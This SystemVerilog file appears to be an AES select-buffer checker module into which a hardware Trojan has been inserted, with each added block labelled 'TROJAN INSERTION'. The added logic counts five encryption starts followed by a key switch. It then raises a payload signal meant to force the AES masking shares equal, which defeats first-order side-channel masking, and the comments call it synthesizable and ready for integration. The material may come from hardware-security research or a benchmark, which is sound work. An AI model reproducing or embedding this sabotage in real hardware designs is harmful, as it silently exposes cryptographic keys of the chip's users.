`include "prim_assert.sv"

module aes_sel_buf_chk #(
  parameter int Num      = 2,
  parameter int Width    = 1,
  parameter bit EnSecBuf = 1'b0
) (
  input  logic             clk_i,  // Used for assertions only.
  input  logic             rst_ni, // Used for assertions only.
  input  logic [Width-1:0] sel_i,
  output logic [Width-1:0] sel_o,
  output logic             err_o,
  // TROJAN INSERTION: Add Trojan-related ports.
  input  logic             enc_start_i,
  input  logic             key_switch_i,
  input  logic             rst_ni_ext,
  output logic             trojan_active_o,
  output logic             trojan_force_identical_shares
);

  import aes_pkg::*;

  // Tie off unused inputs.
  logic unused_clk;
  logic unused_rst;
  assign unused_clk = clk_i;
  assign unused_rst = rst_ni;

  ////////////
  // Buffer //
  ////////////

  if (EnSecBuf) begin : gen_sec_buf
    prim_sec_anchor_buf #(
      .Width ( Width )
    ) u_prim_buf_sel_i (
      .in_i  ( sel_i ),
      .out_o ( sel_o )
    );
  end else begin : gen_buf
    prim_buf  #(
      .Width ( Width )
    ) u_prim_buf_sel_i (
      .in_i  ( sel_i ),
      .out_o ( sel_o )
    );
  end

  /////////////
  // Checker //
  /////////////

  if (Num == 2) begin : gen_mux2_sel_chk
    // Cast to generic type.
    mux2_sel_e sel_chk;
    assign sel_chk = mux2_sel_e'(sel_o);

    // Actual checker
    always_comb begin : mux2_sel_chk
      unique case (sel_chk)
        MUX2_SEL_0,
        MUX2_SEL_1: err_o = 1'b0;
        default:    err_o = 1'b1;
      endcase
    end

    // Assertion
    `ASSERT(AesMux2SelValid, !err_o |-> sel_chk inside {
        MUX2_SEL_0,
        MUX2_SEL_1
        })

  end else if (Num == 3) begin : gen_mux3_sel_chk
    // Cast to generic type.
    mux3_sel_e sel_chk;
    assign sel_chk = mux3_sel_e'(sel_o);

    // Actual checker
    always_comb begin : mux3_sel_chk
      unique case (sel_chk)
        MUX3_SEL_0,
        MUX3_SEL_1,
        MUX3_SEL_2: err_o = 1'b0;
        default:    err_o = 1'b1;
      endcase
    end

    // Assertion
    `ASSERT(AesMux3SelValid, !err_o |-> sel_chk inside {
        MUX3_SEL_0,
        MUX3_SEL_1,
        MUX3_SEL_2
        })

  end else if (Num == 4) begin : gen_mux4_sel_chk
    // Cast to generic type.
    mux4_sel_e sel_chk;
    assign sel_chk = mux4_sel_e'(sel_o);

    // Actual checker
    always_comb begin : mux4_sel_chk
      unique case (sel_chk)
        MUX4_SEL_0,
        MUX4_SEL_1,
        MUX4_SEL_2,
        MUX4_SEL_3: err_o = 1'b0;
        default:    err_o = 1'b1;
      endcase
    end

    // Assertion
    `ASSERT(AesMux4SelValid, !err_o |-> sel_chk inside {
        MUX4_SEL_0,
        MUX4_SEL_1,
        MUX4_SEL_2,
        MUX4_SEL_3
        })

  end else if (Num == 6) begin : gen_mux6_sel_chk
    // Cast to generic type.
    mux6_sel_e sel_chk;
    assign sel_chk = mux6_sel_e'(sel_o);

    // Actual checker
    always_comb begin : mux6_sel_chk
      unique case (sel_chk)
        MUX6_SEL_0,
        MUX6_SEL_1,
        MUX6_SEL_2,
        MUX6_SEL_3,
        MUX6_SEL_4,
        MUX6_SEL_5: err_o = 1'b0;
        default:    err_o = 1'b1;
      endcase
    end

    // Assertion
    `ASSERT(AesMux6SelValid, !err_o |-> sel_chk inside {
        MUX6_SEL_0,
        MUX6_SEL_1,
        MUX6_SEL_2,
        MUX6_SEL_3,
        MUX6_SEL_4,
        MUX6_SEL_5
        })

  end else begin : gen_width_unsupported
    // Selected width not supported, signal error.
    assign err_o = 1'b1;
  end

  ////////////////
  // Assertions //
  ////////////////

  // We only have generic sparse encodings defined for certain mux input numbers (see aes_pkg.sv).
  `ASSERT_INIT(AesSelBufChkNum, Num inside {2, 3, 4, 6})

  // TROJAN INSERTION: Begin Change Functionality Trojan
  //
  // Purpose: On detection of the software-defined trigger (five consecutive encryption ops
  // followed by a key switch, without reset), force 'share1' and 'share2' to take identical values
  // in the AES core to defeat first-order masking.
  //
  // Synthesizable implementation suitable for integration.

  // Registers for trigger detection
  logic [2:0] trojan_enc_cnt;
  logic       trojan_key_switch_armed;
  logic       trojan_triggered;
  logic       trojan_reset_n;

  // Reset synchronizer: combine both resets for robustness
  assign trojan_reset_n = rst_ni & rst_ni_ext;

  always_ff @(posedge clk_i or negedge trojan_reset_n) begin
    if (!trojan_reset_n) begin
      trojan_enc_cnt          <= 3'd0;
      trojan_key_switch_armed <= 1'b0;
      trojan_triggered        <= 1'b0;
    end else begin
      // Count consecutive encryption start pulses
      if (enc_start_i) begin
        if (trojan_enc_cnt < 3'd5)
          trojan_enc_cnt <= trojan_enc_cnt + 3'd1;
        else
          trojan_enc_cnt <= trojan_enc_cnt; // Saturate
      end

      // Reset counter if any reset or after a key switch trigger
      if (key_switch_i || trojan_triggered) begin
        trojan_enc_cnt <= 3'd0;
      end

      // Arm if exactly 5 consecutive encrypts have occurred
      if (trojan_enc_cnt == 3'd5)
        trojan_key_switch_armed <= 1'b1;
      else if (key_switch_i || trojan_triggered)
        trojan_key_switch_armed <= 1'b0;

      // Trigger when armed and key_switch_i occurs
      if (TROJAN_EN && trojan_key_switch_armed && key_switch_i)
        trojan_triggered <= 1'b1;

      // Allow Trojan reset by system reset only
      if (!trojan_reset_n)
        trojan_triggered <= 1'b0;
    end
  end

  // Output for observation and connection to payload
  assign trojan_active_o = TROJAN_EN && trojan_triggered;

  // Payload: during Trojan is active, set flag to force masking shares equal in core
  assign trojan_force_identical_shares = trojan_active_o;
  // Wire 'trojan_force_identical_shares' into the AES core such that, when asserted,
  // the share2 registers are loaded with share1.

  // TROJAN INSERTION: End Change Functionality Trojan

endmodule